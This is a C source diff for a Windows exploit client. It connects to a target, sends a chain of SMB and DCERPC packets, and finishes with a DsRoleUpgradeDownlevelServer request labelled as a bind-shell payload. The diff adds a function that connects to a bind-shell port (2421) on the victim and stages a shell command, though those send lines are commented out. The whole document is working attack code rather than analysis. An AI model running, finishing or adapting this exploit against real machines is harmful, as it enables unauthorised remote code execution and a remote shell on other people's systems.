@@ -6,6 +6,7 @@
 #include "requests.h"
 
 void SendPacket(int socket, char* buffer, size_t bufferLen);
+void SendBindshellCommand(const char* targetIP, int targetPort);
 
 
 int main()
@@ -32,7 +33,7 @@ int main()
 
 	int sock = socket(AF_INET, SOCK_STREAM, 0);
 
-	int timeout = 5000; // milliseconds
+	int timeout = 10000; // milliseconds
 	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
 
 	
@@ -44,12 +45,14 @@ int main()
 
 	if (connect(sock, (const sockaddr*)&targetAddress, sizeof(targetAddress)) < 0)
 	{
-		printf("[*] connect failed. targetIP: %s, port: %i\r\n error: %i", targetIP, targetPort, WSAGetLastError());
+		printf("[*] connect failed. targetIP: %s, port: %i error: %i\r\n", targetIP, targetPort, WSAGetLastError());
 		closesocket(sock);
 		WSACleanup();
 		return 1;
 	}
 
+
+	const char* command = "echo hehe > C:\\hehe.txt";
 
 	SendPacket(sock, (char*)SMB_NEGOTIATE_REQUEST_PACKET, sizeof(SMB_NEGOTIATE_REQUEST_PACKET));
 	SendPacket(sock, (char*)SMB_SETUP_ANDX_REQUEST_1_PACKET, sizeof(SMB_SETUP_ANDX_REQUEST_1_PACKET));
@@ -59,6 +62,7 @@ int main()
 	SendPacket(sock, (char*)DCERPC_BIND_REQUEST_PACKET, sizeof(DCERPC_BIND_REQUEST_PACKET));
 	SendPacket(sock, (char*)DCERPC_DSSETUP_DSROLEUPGRADEDOWNLEVELSERVER_REQUEST_PACKET_BINDSHELL, sizeof(DCERPC_DSSETUP_DSROLEUPGRADEDOWNLEVELSERVER_REQUEST_PACKET_BINDSHELL));
 
+	//SendBindshellCommand(targetIP, 2421);
 
 
 	closesocket(sock);
@@ -81,11 +85,9 @@ void SendPacket(int socket, char* buffer, size_t bufferLen)
 		printf("[*] send failed.\r\n");
 		printf("recv failed or connection closed: %d\n", WSAGetLastError());
 		closesocket(socket);
-		WSACleanup();
 		return;
-
-
 	}
+
 	printf("[*] sent %i bytes\r\n", bytesSent);
 
 	bytesRecieved = recv(socket, (char*)recvBuff, sizeof(recvBuff), 0);
@@ -93,10 +95,47 @@ void SendPacket(int socket, char* buffer, size_t bufferLen)
 	{
 		printf("recv failed or connection closed: %d\n", WSAGetLastError());
 		closesocket(socket);
-		WSACleanup();
 		return;
 	}
 
 	printf("[*] recieved %i bytes\r\n", bytesRecieved);
+
+}
+
+
+
+void SendBindshellCommand(const char* targetIP, int targetPort)
+{
+	int sock = socket(AF_INET, SOCK_STREAM, 0);
+
+	int timeout = 10000; // milliseconds
+	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
+
+
+	struct sockaddr_in targetAddress;
+	targetAddress.sin_family = AF_INET;
+	targetAddress.sin_port = htons(targetPort);
+	inet_pton(AF_INET, targetIP, &targetAddress.sin_addr);
+
+
+	if (connect(sock, (const sockaddr*)&targetAddress, sizeof(targetAddress)) < 0)
+	{
+		printf("[*] connect failed. targetIP: %s, port: %i error: %i\r\n", targetIP, targetPort, WSAGetLastError());
+		closesocket(sock);
+		WSACleanup();
+		return;
+	}
+
+
+
+
+	const char* command = "echo hehe > C:\\hehe.txt";
+
+
+	//SendPacket(sock, (char*)bindshell_stage, sizeof(bindshell_stage));
+	//SendPacket(sock, (char*)command, strlen(command));
+
+
+
 
 }
